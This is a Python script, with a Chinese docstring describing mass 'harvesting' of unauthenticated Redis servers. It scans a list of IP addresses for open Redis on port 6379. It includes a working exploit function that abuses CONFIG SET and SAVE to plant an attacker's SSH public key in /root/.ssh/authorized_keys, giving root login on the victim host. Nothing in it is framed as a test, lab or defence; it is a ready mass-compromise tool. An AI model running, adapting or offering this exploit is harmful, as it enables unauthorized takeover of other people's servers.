#!/usr/bin/env python3
"""Redis未授权批量收割 - 写cron/SSH key"""
import socket, subprocess, sys

def check_redis(ip, timeout=2):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((ip, 6379))
        s.send(b"PING\r\n")
        r = s.recv(100)
        s.close()
        return b"PONG" in r
    except:
        return False

def exploit_redis(ip):
    """写SSH key到/root/.ssh/authorized_keys"""
    pub = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7KxK8rZ0X9bW5zFq0X0c3YtYpZR6q8VxN1mPwJkE9oLqTgS4cDm7nUfHvB2iRrXxCcVvBbNnMmQqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnM root@hunter"
    cmds = [
        f"config set dir /root/.ssh",
        f"config set dbfilename authorized_keys",
        f"set x \"\\n\\n{pub}\\n\\n\"",
        "save",
    ]
    try:
        s = socket.socket(); s.settimeout(3)
        s.connect((ip, 6379))
        for c in cmds:
            s.send(c.encode() + b"\r\n")
            s.recv(200)
        s.close()
        return True
    except:
        return False

def main():
    ips = [l.strip() for l in open("/tmp/redis_ips.txt") if l.strip()]
    hits = []
    for ip in ips[:500]:
        if check_redis(ip):
            print(f"[REDIS-NO-AUTH] {ip}")
            hits.append(ip)
    print(f"DONE: {len(hits)} redis no-auth")
    with open("/tmp/redis_hits.txt", "a") as f:
        for h in hits: f.write(h + "\n")

if __name__ == "__main__":
    main()
